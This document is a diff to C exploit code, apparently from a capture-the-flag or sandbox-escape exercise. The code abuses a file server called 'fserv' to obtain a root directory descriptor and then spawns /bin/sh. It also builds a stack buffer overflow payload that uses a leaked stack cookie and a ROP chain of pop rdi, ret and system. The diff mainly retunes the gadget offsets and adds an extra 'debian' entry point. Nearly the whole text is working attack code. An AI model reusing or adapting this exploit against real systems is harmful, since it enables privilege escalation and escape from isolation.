@@ -177,6 +177,7 @@ void fserv_main(int client) {
 
     int fd = open(filename, hdr.oflags, hdr.perm);
     if (fd < 0) {
+      warn("open failed");
       goto send_error;
     }
 
@@ -239,6 +240,7 @@ int exploit(int argc, char **argv) {
   CHK(write_exact, sock, &hdr, sizeof(hdr));
   CHK(write_exact, sock, buff, hdr.name_sz);
 
+  printf("Opening: %s in fserv\n", buff);
   int fd = CHK(recvfd, sock);
   printf("Opened root dir on fd %d. Droping to shell...\n", fd);
   system("/bin/sh");
@@ -306,15 +308,17 @@ char *write_bof_exp() {
   uint64_t *ptr = (uint64_t*)(buf + 0x98);
   *(uint64_t*)(buf + 0x88) = cookie;
 
-  *(ptr++) = exe_addr + 0xc1a0; // pop rdi ; ret
+  *(ptr++) = exe_addr + 0xc1c0; // pop rdi ; ret
   uint64_t *save = ptr++;
-  *(ptr++) = exe_addr + 0xc1a1; // ret
-  *(ptr++) = exe_addr + 0x14e90; // system
+  *(ptr++) = exe_addr + 0xc1c1; // ret
+  *(ptr++) = exe_addr + 0x14eb0; // system
 
   strcpy((char*)ptr, "/tmp/fserv");
   *save = buff_addr + ((char*)ptr - buf);
   return buf;
 }
+
+int exec_debian();
 
 int main(int argc, char **argv) {
   setbuf(stdout, NULL);
@@ -332,6 +336,7 @@ int main(int argc, char **argv) {
     symlink("busybox", "/bin/exp");
     symlink("busybox", "/bin/fserv");
     symlink("busybox", "/bin/start_fserv");
+    symlink("busybox", "/bin/debian");
 
     int in = open("/proc/self/exe", O_RDONLY);
     int out = open("/bin/busybox", O_CREAT | O_WRONLY, 0777);
@@ -351,9 +356,11 @@ int main(int argc, char **argv) {
     if (argc >= 2) parent_fd = atoi(argv[1]);
     CHK(write, parent_fd, buf, BUF_READ);
   } else if (!strcmp(filename, "exp")) {
-    exploit(argc, argv);
+    return exploit(argc, argv);
+  } else if (!strcmp(filename, "debian")) {
+    return exec_debian();
   } else if (!strcmp(filename, "fserv")) {
-    fserv();
+    return fserv();
   } else {
     return execl("/bin/busybox", "/bin/sh", NULL);
   }
